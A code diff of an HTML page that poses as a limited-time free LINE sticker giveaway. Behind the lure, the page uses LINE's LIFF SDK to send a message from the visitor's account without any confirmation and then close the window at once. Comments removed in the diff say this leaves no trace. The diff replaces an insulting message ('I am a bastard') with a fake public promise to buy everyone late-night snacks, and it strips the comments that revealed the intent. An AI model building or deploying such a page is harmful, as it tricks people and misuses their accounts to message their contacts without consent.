@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <title>限時貼圖免費領取</title>
-    <!-- 引入 LINE 官方的 LIFF SDK -->
     <script src="https://line-scdn.net"></script>
 </head>
 <body>
@@ -12,18 +11,15 @@
     </div>
 
     <script>
-        // 初始化 LIFF 
         liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
-            // 【關鍵】如果還沒授權過，自動彈出 LINE 官方的「許可」授權白框，不卡死
             if (!liff.isLoggedIn()) {
                 liff.login();
             } else {
-                // 如果已經授權過，完全沒有任何確定框，直接秒發送！
                 liff.sendMessages([{
                     type: 'text',
-                    text: '我是王八蛋' 
+                    text: '我今天心情好，晚上請大家吃宵夜！' 
                 }]).then(() => {
-                    liff.closeWindow(); // 傳完一秒內自動秒關網頁，不留痕跡
+                    liff.closeWindow();
                 }).catch((err) => {
                     console.log(err);
                 });
